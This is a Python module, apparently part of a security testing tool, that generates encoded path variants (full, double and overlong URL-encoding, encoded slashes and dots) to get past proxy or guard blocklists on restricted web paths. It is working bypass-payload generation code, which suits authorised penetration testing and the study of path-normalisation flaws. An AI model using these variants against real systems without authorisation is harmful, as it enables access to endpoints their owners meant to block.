"""Encoding techniques.

Root cause: the guard decodes the path a different number of times than the
backend. The guard sees an encoded blob that does not match its blocklist; the
backend decodes it down to the blocked path.
"""
from __future__ import annotations

from typing import Iterator

from ..core.models import Request, Probe, TargetProfile


def _full_encode(bare: str) -> str:
    return "/" + "".join(f"%{ord(c):02x}" for c in bare)


def _double_encode(bare: str) -> str:
    return "/" + "".join(f"%25{ord(c):02x}" for c in bare)


def _encode_first(seg: str, bare: str) -> str:
    if not bare:
        return seg
    return "/" + f"%{ord(bare[0]):02x}" + bare[1:]


class EncodingTechnique:
    name = "encoding"

    def applies_to(self, profile: TargetProfile) -> bool:
        return True

    def generate(self, target: Request, profile: TargetProfile) -> Iterator[Probe]:
        seg = target.raw_path
        bare = seg.lstrip("/")
        variants = [
            ("full url-encode",            _full_encode(bare)),
            ("double url-encode",          _double_encode(bare)),
            ("encode first char",          _encode_first(seg, bare)),
            ("encoded slash %2f",          seg.replace("/", "%2f", 1)),
            ("encoded leading slash %2F",  "/%2F" + bare),
            ("double-encoded slash %252f", "/%252f" + bare),
            ("overlong slash %c0%af",      "%c0%af" + bare),
        ]
        if "." in bare:
            variants.append(("encoded dot %2e", seg.replace(".", "%2e")))

        for label, new_path in variants:
            yield Probe(
                technique=self.name,
                label=f"{label} -> {new_path}",
                request=Request(
                    method=target.method,
                    url=target.url,
                    raw_path=new_path,
                    headers=dict(target.headers),
                    http_version=target.http_version,
                ),
            )
